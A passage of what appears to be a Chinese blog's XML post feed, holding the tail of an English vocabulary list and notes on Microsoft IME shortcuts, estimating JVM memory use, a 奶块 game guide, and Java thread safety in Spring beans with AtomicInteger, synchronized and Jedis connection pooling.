sticity</li><li>specialization</li><li>deteriorate</li><li>performed</li><li>undermined</li><li>desert</li><li>staying up late</li><li>be responsible for</li><li>take over</li><li>sentence by sentence</li><li>translates one when it encounters one</li><li>the quest to</li><li>for years</li><li>be presented as</li><li>put in</li><li>and then</li><li>associate professor</li><li>it may not be</li><li>London-based firms</li><li>had a lot in common</li><li>in the name of</li><li>standing in their way to</li><li>take on</li><li>even though</li><li>split…into…</li><li>a fortune 500 company</li><li>be reminded to</li><li>over the next four years</li><li>like to</li><li>40% less… than…</li><li>it’s up to me</li><li>gathering pace</li><li>the prevalence of</li><li>by</li><li>pearls of</li><li>compare…to…</li><li>just the same</li><li>out on our own</li><li>be to blame for</li><li>for all</li><li>well over a pound</li><li>fund</li><li>indirectly</li><li>direct</li><li>invalueable</li><li>non-profit foundations</li><li>companies doing development</li><li>indirectly support</li><li>out of their own pockets</li><li>nuclear</li><li>biases</li><li>end up</li><li>safeguards</li><li>in place to</li><li>science proceeds</li><li>it pays to</li><li>make all of this</li><li>recommendations</li><li>…do…good</li><li>spied</li><li>just as</li><li>declines</li><li>over the years</li><li>declines over the years</li><li>so does</li><li>as long as</li><li>Conventional fixes</li><li>enterprise</li><li>genetically gifted</li><li>fashion</li><li>trifle</li><li>meant in</li><li>given era</li><li>particularly fashion</li><li>plcae on</li><li>the rise of</li><li>underlying</li><li>status</li><li>dense</li><li>more than a little dense</li><li>spared his sharp analysis</li><li>intellectual profoundness</li><li>profoundness</li><li>dressed in</li><li>deprive</li><li>stock</li><li>multitudinous</li></ol>]]></content>
    
    
    <categories>
      
      <category>英语</category>
      
      <category>英语单词</category>
      
      <category>四级单词</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：微软输入法</title>
    <link href="/2025/05/31/%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%BE%AE%E8%BD%AF%E8%BE%93%E5%85%A5%E6%B3%95/"/>
    <url>/2025/05/31/%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%BE%AE%E8%BD%AF%E8%BE%93%E5%85%A5%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="计算模式"><a href="#计算模式" class="headerlink" title="计算模式"></a>计算模式</h2><p>计算模式是：v + 数字计算，例如：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%BE%AE%E8%BD%AF%E8%BE%93%E5%85%A5%E6%B3%95/image-20250531121411953.png"></p><hr><h2 id="日期-时间"><a href="#日期-时间" class="headerlink" title="日期 &#x2F; 时间"></a>日期 &#x2F; 时间</h2><p>日期是：rq，时间是：sj，例如：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%BE%AE%E8%BD%AF%E8%BE%93%E5%85%A5%E6%B3%95/image-20250531121506786.png"></p><hr><h2 id="间隔符"><a href="#间隔符" class="headerlink" title="间隔符"></a>间隔符</h2><p>使用 ‘ 作为间隔符，例如：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%BE%AE%E8%BD%AF%E8%BE%93%E5%85%A5%E6%B3%95/image-20250531121544947.png"></p><hr><h2 id="自定义短句"><a href="#自定义短句" class="headerlink" title="自定义短句"></a>自定义短句</h2><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%BE%AE%E8%BD%AF%E8%BE%93%E5%85%A5%E6%B3%95/image-20250531122053154.png"></p><hr>]]></content>
    
    
    <categories>
      
      <category>输入法</category>
      
      <category>微软输入法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：JVM</title>
    <link href="/2025/05/29/%E7%AC%94%E8%AE%B0%EF%BC%9AJVM/"/>
    <url>/2025/05/29/%E7%AC%94%E8%AE%B0%EF%BC%9AJVM/</url>
    
    <content type="html"><![CDATA[<h2 id="JVM-概述"><a href="#JVM-概述" class="headerlink" title="JVM 概述"></a>JVM 概述</h2><h3 id="Java-从编码到执行的流程"><a href="#Java-从编码到执行的流程" class="headerlink" title="Java 从编码到执行的流程"></a>Java 从编码到执行的流程</h3><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/VM/image-20250529103837116.png"></p><hr><h3 id="JVM-是什么"><a href="#JVM-是什么" class="headerlink" title="JVM 是什么"></a>JVM 是什么</h3><p>我现在明白你真正的意思了：你不是在讨论“怎么去类加载器分析”，也不是在问 JVM 的哪些分区怎么运作；你其实是在问——</p><p>“我写了一个程序，里面有很多类、方法、变量，那它到底运行起来会占多少内存？怎么知道？”</p><p>换句话说，你是站在开发者角度，不是在搞操作系统理论，也不是在讲 JVM 的架构，而是非常现实地在问：</p><p>“我做了一个 Java&#x2F;Web 项目，我怎么知道它运行的时候大概要占多少内存？”</p><p>⸻</p><p>那我重新整理、直接回答你这个问题：</p><p>⸻</p><p>✅ 一个程序到底占多少内存？这取决于三部分：<br>    1.静态资源大小（类、字节码、常量池等）<br>    •这是编译生成后的 .class 文件所占空间，加载后会占用 JVM 的元空间。<br>    •比如，你有 1000 个类，每个类字节码几 KB，那么运行时大概就会占用几 MB 的元空间。<br>    2.运行时对象的内存占用（堆）<br>    •这包括你 new 出来的所有对象、集合、缓存等等。<br>    •数量和结构不确定，取决于：访问量、业务逻辑、缓存策略等。<br>    3.线程、栈帧、JNI、本地资源等<br>    •每个线程都要一个线程栈，默认大概 512 KB ~ 1 MB。<br>    •如果你用到了很多并发，或者底层库（如 Netty、Redis 客户端）还会分配额外内存。</p><p>⸻</p><p>✅ 那你怎么知道“整个程序”会占多少内存？</p><p>这不是靠“看代码”或者“加总类字段”能算出来的 —— Java 程序的内存是运行时才知道的。</p><p>所以现实中有两种办法来掌握这件事：</p><p>⸻</p><p>🔍 方法一：运行实测（推荐）</p><p>这是最靠谱的方式，尤其是你做 Web 项目的话：<br>    •部署程序后，用以下方式实时观察内存使用：</p><p>工具功能<br>jps + jstat &#x2F; jmap看 JVM 堆内存分布、类占用<br>VisualVM &#x2F; JConsole图形化查看堆、类加载、线程等<br>JFR（Java Flight Recorder）更深入的事件和内存追踪<br>Prometheus + Micrometer生产上用来监控服务内存使用<br>top &#x2F; ps aux &#x2F; docker stats直接看整个进程占了多少物理内存</p><p>这样你可以知道：<br>    •程序启动时占多少内存<br>    •并发访问时内存增长情况<br>    •有无内存泄漏、频繁 GC 等问题</p><p>⸻</p><p>📊 方法二：静态预估（用于部署前做预算）</p><p>你可以基于经验做粗略估算：<br>    •项目启动初期：一个中等 Spring Boot Web 项目，启动后常驻内存约 150MB~500MB<br>    •平稳运行期：根据并发用户量、数据量、缓存策略，动态增长<br>    •配置 JVM 参数限制最大堆：比如 -Xmx1024m</p><p>示例配置：</p><p>java -Xms512m -Xmx1024m -XX:MaxMetaspaceSize&#x3D;256m -jar myapp.jar</p><p>这就相当于你告诉操作系统：“我这个程序最多会占用 1.25 GB 左右的内存”，超了就 OutOfMemory。</p><p>⸻</p><p>✍️ 所以你现在问的是：</p><p>💬“我开发了一个很大的项目，有很多类，有很多对象，那它到底运行时会占多大？”</p><p>那答案就是：</p><p>✅ 你无法静态知道它到底占多少内存，但你可以通过运行实测 + JVM 参数控制 + 历史经验来掌握和约束它的内存使用。</p><p>⸻</p><p>如果你愿意我可以：<br>    •给你写个小 demo，让你看到对象和类的真实内存占用；<br>    •或者教你用 VisualVM 连上你的 Java 程序，看看它现在占了多少内存；<br>    •或者我们一起估算一下你项目中的几个典型组件（如缓存、线程池）大概会吃多少堆空间。</p><p>你想具体看哪部分？我可以陪你一步步操作。</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
      <category>Java Virtual Machine（JVM）</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：奶块攻略</title>
    <link href="/2025/05/28/%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%A5%B6%E5%9D%97%E6%94%BB%E7%95%A5/"/>
    <url>/2025/05/28/%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%A5%B6%E5%9D%97%E6%94%BB%E7%95%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="1-常去村子"><a href="#1-常去村子" class="headerlink" title="1. 常去村子"></a>1. 常去村子</h2><h3 id="1-1-基础物资村"><a href="#1-1-基础物资村" class="headerlink" title="1.1. 基础物资村"></a>1.1. 基础物资村</h3><ol><li>1 东 驯鹿</li><li>6 东 石门</li><li>8 东 马尔斯</li><li>2 中 星愿</li><li>28 中 灰水</li><li>7 西北苔石</li></ol><hr><h3 id="1-2-装备村"><a href="#1-2-装备村" class="headerlink" title="1.2. 装备村"></a>1.2. 装备村</h3><ol><li>1 中 宅院</li><li>4 东南 东海龙宫</li><li>5 中 愉叔</li><li>5 中 世贸</li><li>10 中 九服装备</li><li>12 中 聚鑫</li><li>29 东 青苍阁</li></ol><hr><h3 id="1-3-坐骑食物村"><a href="#1-3-坐骑食物村" class="headerlink" title="1.3. 坐骑食物村"></a>1.3. 坐骑食物村</h3><ol><li>5 东 精灵</li></ol><hr><h3 id="1-4-坐骑鞍具村"><a href="#1-4-坐骑鞍具村" class="headerlink" title="1.4. 坐骑鞍具村"></a>1.4. 坐骑鞍具村</h3><ol><li>6 东 石门</li></ol><hr><h3 id="1-5-糖果村"><a href="#1-5-糖果村" class="headerlink" title="1.5. 糖果村"></a>1.5. 糖果村</h3><ol><li>1 中 夜宵</li><li>8 北 迷途</li><li>18 南 豪博</li></ol><hr><h3 id="1-6-精灵礼物村"><a href="#1-6-精灵礼物村" class="headerlink" title="1.6. 精灵礼物村"></a>1.6. 精灵礼物村</h3><ol><li>5 东 精灵</li><li>7 北 童话</li></ol><hr><h3 id="1-7-精灵装备村"><a href="#1-7-精灵装备村" class="headerlink" title="1.7. 精灵装备村"></a>1.7. 精灵装备村</h3><ol><li>1 中 九服商艺</li><li>2 南 蔷薇</li><li>3 中 精灵</li><li>7 北 童话</li><li>8 东 精灵谷</li><li>20 南 精灵</li></ol><hr><h3 id="1-8-皮毛锭村"><a href="#1-8-皮毛锭村" class="headerlink" title="1.8. 皮毛锭村"></a>1.8. 皮毛锭村</h3><ol><li>1 东 劫情殿</li><li>2 北 九龙</li><li>5 北 纽约</li><li>6 东 产业园</li><li>25 西南 凝光</li><li>27 南 冰儿</li><li>可出药水：<ol><li>6 东 产业园</li><li>25 西南 凝光</li></ol></li></ol><hr><h3 id="1-9-中桌村"><a href="#1-9-中桌村" class="headerlink" title="1.9. 中桌村"></a>1.9. 中桌村</h3><ol><li>2 中 星愿小店</li><li>19 东 阿瓦隆</li></ol><hr><h2 id="2-红月时间"><a href="#2-红月时间" class="headerlink" title="2. 红月时间"></a>2. 红月时间</h2><ol><li>10:40-11:00</li><li>13:20-13:40</li><li>16:00-16:20</li><li>18:40-19:00</li><li>21:20-21:40</li><li>00:00-00:20</li><li>02:40-03:00</li><li>05:20-05:40</li><li>08:00-08:20<br>注意事项：红月时间尼伯传送不一定会开，以下尼伯传送时间为准<br>早上 10:40 - 11:00<br>中午 13:20 - 13:40<br>下午 16:00 - 16:20<br>晚上 18:40 - 19:00<br>晚上 21:20 - 21:40</li></ol><hr><h2 id="3-各种木头获得方式"><a href="#3-各种木头获得方式" class="headerlink" title="3. 各种木头获得方式"></a>3. 各种木头获得方式</h2><ol><li>&#x3D;&#x3D;暮色森林&#x3D;&#x3D;：<ol><li>白松木</li><li>森林巨木</li><li>紫薇木</li><li>枫木</li><li>沼泽木</li></ol></li><li>&#x3D;&#x3D;炽热大陆&#x3D;&#x3D;：<ol><li>棕榈木</li><li>乔木</li><li>胡杨木</li></ol></li><li>&#x3D;&#x3D;极寒之境&#x3D;&#x3D;：<ol><li>紫松木</li><li>雪柏木</li><li>银杉木</li></ol></li><li>&#x3D;&#x3D;遗忘之境&#x3D;&#x3D;：<ol><li>柳树木</li><li>紫树木（上层）</li></ol></li><li>&#x3D;&#x3D;米德加德&#x3D;&#x3D;：<ol><li>杏树木</li><li>紫月树、</li><li>樟树</li></ol></li></ol><hr><h2 id="4-巨龙时间和坐标"><a href="#4-巨龙时间和坐标" class="headerlink" title="4. 巨龙时间和坐标"></a>4. 巨龙时间和坐标</h2><p>1点: 6300:5000<br>2点: 5000:3700<br>3点: 3700:5000<br>4点: 5000:6300<br>5点: 6300:5000<br>6点: 5000:3700<br>7点: 3700:5000<br>8点: 5000:6300<br>9点: 6300:5000<br>10点: 5000:3700<br>11点: 3700:5000<br>12点: 5000:6300<br>13点: 6300:5000<br>14点: 5000.3700<br>15点: 3700.5000<br>16点: 5000.6300<br>17点: 6300.5000<br>18点: 5000.3700<br>19点: 3700.5000<br>20点: 5000.6300<br>21点: 6300.5000<br>22点: 5000.3700<br>23点: 3700.5000<br>24点: 5000.6300</p><hr><h2 id="5-奶块提振"><a href="#5-奶块提振" class="headerlink" title="5. 奶块提振"></a>5. 奶块提振</h2><h3 id="5-1-步骤一：设置奶块的图形首选项"><a href="#5-1-步骤一：设置奶块的图形首选项" class="headerlink" title="5.1. 步骤一：设置奶块的图形首选项"></a>5.1. 步骤一：设置奶块的图形首选项</h3><ol><li>打开 <strong>电脑设置</strong>，点击 <strong>系统</strong>，然后选择 <strong>显示</strong>。</li><li>在显示设置界面，向下滚动并选择 <strong>图形设置</strong>。</li><li>在 <strong>应用程序的自定义设置</strong> 中，点击 <strong>添加桌面应用</strong></li><li>添加 <strong>奶块</strong>，例如我的安装路径是：<code>E:\奶块\netcraft.exe</code>。</li><li>在奶块的 <strong>GPU 首选项</strong> 中，选择 <strong>高性能</strong>。</li></ol><hr><h3 id="5-2-步骤二：设置奶块的高帧率"><a href="#5-2-步骤二：设置奶块的高帧率" class="headerlink" title="5.2. 步骤二：设置奶块的高帧率"></a>5.2. 步骤二：设置奶块的高帧率</h3><ol><li>按 <strong>Win 键</strong>，搜索并打开 <strong>NVIDIA 控制面板</strong>。</li><li>在左侧栏中选择 <strong>管理 3D 设置</strong>。</li><li>在右侧的主内容框中，选择 <strong>程序设置</strong>。</li><li>同样的，找到并选择 <strong>奶块</strong>，例如我的安装路径是：<code>E:\奶块\netcraft.exe</code>。</li><li>设置 <strong>最大帧速率</strong>，例如我将其修改为 <strong>520 帧&#x2F;秒</strong>。</li><li>设置 <strong>虚拟现实预渲染帧数</strong>，选择 <strong>使用 3D 应用程序设置</strong>。</li><li>设置 <strong>首选刷新率</strong>，选择 <strong>最高可用</strong>。</li><li>最后点击 <strong>应用</strong> 保存设置。</li></ol><hr><h3 id="5-3-步骤三：重启奶块（或选择重启电脑）"><a href="#5-3-步骤三：重启奶块（或选择重启电脑）" class="headerlink" title="5.3. 步骤三：重启奶块（或选择重启电脑）"></a>5.3. 步骤三：重启奶块（或选择重启电脑）</h3><p>这样操作后，奶块的图形设置将得到优化，应该可以提升游戏的帧率表现。</p><hr>]]></content>
    
    
    <categories>
      
      <category>游戏</category>
      
      <category>奶块</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：JUC</title>
    <link href="/2025/05/18/%E7%AC%94%E8%AE%B0%EF%BC%9AJUC/"/>
    <url>/2025/05/18/%E7%AC%94%E8%AE%B0%EF%BC%9AJUC/</url>
    
    <content type="html"><![CDATA[<h3 id="1-线程安全问题"><a href="#1-线程安全问题" class="headerlink" title="1. 线程安全问题"></a>1. 线程安全问题</h3><h4 id="1-1-线程安全问题概述"><a href="#1-1-线程安全问题概述" class="headerlink" title="1.1. 线程安全问题概述"></a>1.1. 线程安全问题概述</h4><p>在 Spring 中，我们通常会将某个类声明为 Bean，并通过依赖注入的方式在其他地方调用它的方法。也就是说，不管有多少个调用，最终操作的都是这个单例 Bean 的同一个实例。那么现在问题来了，如果我们将下面这段代码声明为 Bean：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs axapta">@Service  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CounterService</span> &#123;  <br>  <br>    <span class="hljs-comment">// 成员变量 totalCount</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> totalCount = <span class="hljs-number">0</span>;  <br><br><span class="hljs-comment">// 参数 count</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> addCount(<span class="hljs-built_in">int</span> <span class="hljs-keyword">count</span>) &#123;  <br>    <span class="hljs-comment">// 局部变量 c</span><br>    <span class="hljs-built_in">int</span> c = <span class="hljs-number">10</span>;<br>        totalCount += <span class="hljs-keyword">count</span>;  <br>        <span class="hljs-keyword">return</span> totalCount;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>并在其他组件中注入并调用它的方法：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@RestController</span><br><span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">&quot;/counter&quot;</span>)<br>public class CounterController &#123;<br><br>    <span class="hljs-variable">@Autowired</span><br>    private CounterService counterService;<br><br>    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">&quot;/add&quot;</span>)<br>    public int <span class="hljs-built_in">addCount</span>(<span class="hljs-variable">@RequestParam</span> int value) &#123;<br>        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">counterService</span><span class="hljs-selector-class">.addCount</span>(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在传统的 Tomcat 服务器中，每个 HTTP 请求会由一个独立的线程处理，当这个线程调用 <code>addCount()</code> 方法时：</p><ol><li>方法参数 <code>count</code> 和局部变量 <code>c</code> 是线程私有的，分配在各自线程的栈内存中，每个线程都有独立副本，互不干扰，因此天然线程安全</li><li>而 <code>totalCount</code> 是 Bean 的成员变量，存放在堆内存中，为所有线程所共享，因此存在并发读写的风险。</li></ol><p>因此，一旦多个请求同时调用该方法，就会触发<strong>竞态条件</strong>：线程们在没有排队的情况下同时抢着修改 <code>totalCount</code>，导致返回的结果不可靠、不确定、不可预测，产生严重的数据错误。</p><p>举个例子：A 线程读取到 <code>totalCount = 10</code>，打算加 5；B 线程同样读取到 10，打算加 7。它们各自完成加法并写回后，可能的结果包括：A 返回 15，B 返回 17；或者 A 返回 17，B 返回 15；甚至 A 返回 17，B 返回 22。注意，这还只是两个线程的情况，在高并发下，<code>totalCount</code> 的最终值将更加不可预测，容易造成严重的数据混乱。</p><p><font color="#ff0000">所以这就是为什么我们的大多数服务和组件都设计为无状态的——也就是说，不在 Bean 中存放可变的成员变量。（不是不放成员变量，而是不放可变的成员变量）</font></p><hr><h4 id="1-2-解决普通服务线程安全问题"><a href="#1-2-解决普通服务线程安全问题" class="headerlink" title="1.2. 解决普通服务线程安全问题"></a>1.2. 解决普通服务线程安全问题</h4><p>为了解决线程安全问题，最理想的做法就是避免在 Bean 中存放可变的成员变量，而是将变量限定为线程私有。但如果业务上确实需要使用成员变量，我们也可以采取以下措施：<br>&#x3D;&#x3D;1.使用线程安全的数据结构（推荐）&#x3D;&#x3D;<br>这些数据结构内部采用了复杂的机制，保证每次更新都是原子操作，同时避免线程阻塞和锁竞争，性能远超 <code>synchronized</code>。</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CounterService</span> </span>&#123;<br><br>    <span class="hljs-comment">// 使用 AtomicInteger 保证线程安全</span><br>    <span class="hljs-keyword">private</span> AtomicInteger totalCount = <span class="hljs-keyword">new</span> AtomicInteger(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span> count)</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">return</span> totalCount.<span class="hljs-title">addAndGet</span><span class="hljs-params">(count)</span></span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.方法加锁&#x3D;&#x3D;<br>给方法加 <code>synchronized</code> 锁后，所有调用都会排队，导致性能下降。比如下面这个例子：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Service</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CounterService</span> </span>&#123;  <br>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> totalCount = <span class="hljs-number">0</span>;  <br><br>    <span class="hljs-comment">// 给方法加 synchronized 锁住整个方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span> count)</span> </span>&#123;  <br>        <span class="hljs-keyword">int</span> c = <span class="hljs-number">10</span>;<br>        totalCount += count;  <br>        <span class="hljs-keyword">return</span> totalCount;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>当一个线程调用 <code>addCount</code> 方法时，整个实例对象（即 <code>this</code>）会被锁定。也就是说，该对象内所有被 <code>synchronized</code> 修饰的实例方法都会被阻塞，直到锁释放。但如果对象内存在未加锁的方法，则不会受到影响，仍可正常调用。</p><p>因此，我们建议只对修改共享成员变量的公共方法加锁，不涉及共享状态的其他方法则尽量避免加锁，以减少性能损耗。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>普通实例方法加 <code>synchronized</code> 时，锁的是当前对象实例（<code>this</code>）</li><li>静态方法加 <code>synchronized static</code> 时，锁的是该类的 Class 对象，所有实例共享同一把锁，所有实例都被锁了，但没加锁的方法，都不会被阻塞，照样可以调用</li></ol></blockquote><p>&#x3D;&#x3D;3.代码块加锁&#x3D;&#x3D;<br>它不是给整个方法加锁，而是在方法内部用一对大括号包裹的代码块，加上 <code>synchronized</code> 关键字，只锁本对象的代码块</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CounterService</span> &#123;  <br>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">totalCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// 自定义锁对象</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addCount</span><span class="hljs-params">(<span class="hljs-type">int</span> count)</span> &#123;  <br>        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br>        <span class="hljs-keyword">synchronized</span> (lock) &#123;  <span class="hljs-comment">// 只锁住对共享变量的操作</span><br>            totalCount += count;  <br>        &#125;<br><br>        <span class="hljs-keyword">return</span> totalCount;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.可变状态放到外部系统（推荐）&#x3D;&#x3D;<br>我们将可变状态甩给外部系统，比如数据库、Redis、消息队列等，从而避免在 Java 服务内部处理线程安全问题。你可能会疑惑：把状态交给它们后，难道外部系统就不会有线程安全问题吗？</p><p>实际上，这些外部系统天生具备强大的并发控制能力，能够帮我们确保状态的一致性。以数据库为例，它天然支持事务和行级锁，即使有上千个线程同时写入，也能通过行锁、MVCC（多版本并发控制）和隔离级别等机制，有效地管理并发访问，保证数据安全和一致。</p><hr><h4 id="1-3-解决外部连接服务线程安全问题"><a href="#1-3-解决外部连接服务线程安全问题" class="headerlink" title="1.3. 解决外部连接服务线程安全问题"></a>1.3. 解决外部连接服务线程安全问题</h4><p>上文我们讲完了普通服务中的线程安全问题和解决方案，但如果该服务涉及外部连接（如数据库、FTP、Redis 等），情况就会变得更复杂，比如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SharedJedisClient</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Jedis</span> jedis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jedis</span>(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">6379</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getValue</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key</span>) &#123;<br>        <span class="hljs-keyword">return</span> jedis.<span class="hljs-title function_">get</span>(key);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setValue</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">String</span> value</span>) &#123;<br>        jedis.<span class="hljs-title function_">set</span>(key, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 Bean 在初始化时就创建了一个 TCP 连接，之后的方法直接使用这个连接执行操作。表面上看，这个 Bean 并没有定义可变的成员变量，连接对象也没在方法中被修改，似乎一切很安全对吧？</p><p>但其实存在严重的线程安全隐患。因为多个线程如果同时调用这个 Bean 中的方法，它们会共享同一个连接对象，导致线程之间对连接的操作交叉进行，可能发生数据错乱、粘包拆包、读写冲突等问题。</p><p>你可能会想，那我不共享连接，每个方法里都 <code>new</code> 一个连接，岂不就天然线程安全了？确实，这样做可以保证线程隔离，但代价也很高。频繁地创建和销毁连接（尤其是 TCP 连接）会造成巨大的性能开销，严重影响系统吞吐量，并不是理想的做法。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">NewPerCallJedisClient</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> getValue(<span class="hljs-keyword">String</span> key) &#123;<br>        <span class="hljs-keyword">try</span> (Jedis jedis = <span class="hljs-keyword">new</span><span class="hljs-type"></span> Jedis(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">6379</span>)) &#123;<br>            <span class="hljs-keyword">return</span> jedis.<span class="hljs-keyword">get</span>(key);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> void setValue(<span class="hljs-keyword">String</span> key, <span class="hljs-keyword">String</span> value) &#123;<br>        <span class="hljs-keyword">try</span> (Jedis jedis = <span class="hljs-keyword">new</span><span class="hljs-type"></span> Jedis(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">6379</span>)) &#123;<br>            jedis.<span class="hljs-keyword">set</span>(key, value);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果我们尝试套用前面解决普通服务线程安全问题的那四种方法，虽然能避免线程冲突，但往往会带来额外的性能开销，尤其是在涉及连接操作时，代价更高。</p><p>其实，我们还有一种更高效的解决方案 —— 连接池。连接池被我们设置为公用的成员变量，所有调用该 Bean 的线程都可以使用它。在每次方法调用时，线程会从连接池中借出一个连接，执行完操作后再归还池中。</p><p>这样既能做到多线程各用自己的连接，避免线程安全问题，又能通过连接复用来减少频繁创建&#x2F;销毁连接的开销，兼顾了线程安全与系统性能。</p><figure class="highlight 